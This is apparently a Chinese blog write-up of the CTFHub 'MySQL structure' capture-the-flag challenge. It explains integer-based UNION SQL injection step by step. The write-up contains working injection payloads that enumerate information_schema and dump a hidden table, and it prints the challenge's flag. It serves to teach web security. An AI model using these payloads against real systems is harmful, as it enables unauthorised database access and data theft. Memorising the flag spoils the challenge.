---
layout: post
title: "CTFHub SQL注入 - MySQL结构"
date: 2026-10-13
categories: ctfhub
tags: [ctfhub,web,sql注入,union注入,MySQL结构]
permalink: /ctfhub/sql-mysql-struct.html
---

# CTFHub SQL注入 - MySQL结构
## 一、题目信息
平台：CTFHub
分类：Web - SQL注入
题目名称：MySQL结构
难度：简单
Flag：`ctfhub{40b718f6e98da4895011c2c0}`

## 二、考点
1. 整数型union联合注入
2. MySQL元数据库`information_schema`查询库、表、字段
3. 掌握MySQL数据库基础结构，理解group_concat函数作用

## 三、题目内容
页面提供ID输入框，提示输入1测试，提交后页面会回显后端执行的SQL语句，存在整数型SQL注入漏洞。后端SQL直接拼接用户输入，没有过滤，可使用union联合查询带出数据。

## 四、解题步骤
1. 判断注入类型：输入`1`页面正常返回数据，输入`1 and 1=2`无结果，判定为整数注入，不需要单引号闭合。
2. 使用`order by`确定查询字段数量：`1 order by 2`正常显示，`1 order by 3`页面报错，确定查询字段数为2。
3. 查询当前数据库名，Payload：`-1 union select 1,database()`
4. 查询数据库内所有表名，Payload：`-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()`
返回表名：`hxyrjyytjq,news`，`hxyrjyytjq`为存放flag的数据表。
5. 查询目标表`hxyrjyytjq`的所有字段名，Payload：`-1 union select 1,group_concat(column_name) from information_schema.columns where table_name='hxyrjyytjq'`
返回字段名：`onbrodcmql`。
6. 查询flag字段数据，Payload：`-1 union select 1,onbrodcmql from hxyrjyytjq`
页面回显数据，拿到flag。

## 五、知识点解析
1. `union select`：联合查询，把两个select查询结果合并。使用`-1`让前面的查询不返回数据，union后面的查询结果就会直接回显到页面。
2. `information_schema`：MySQL内置元数据库，记录数据库内所有库、表、字段的信息，是SQL注入中查询数据库结构的核心。
3. `group_concat()`：将多条查询结果合并成一行字符串，一次性查看全部表名或字段名，简化注入操作。
4. 整数注入：用户输入直接作为数字拼入SQL语句，不需要单引号来闭合字符串。

## 六、总结
本题核心考察union联合注入，同时熟悉MySQL数据库底层结构。利用`information_schema`系统库，依次查询库名、表名、字段名，最后查询目标数据拿到flag。利用`-1`使前面查询结果为空，让union查询的内容直接展示在页面上。
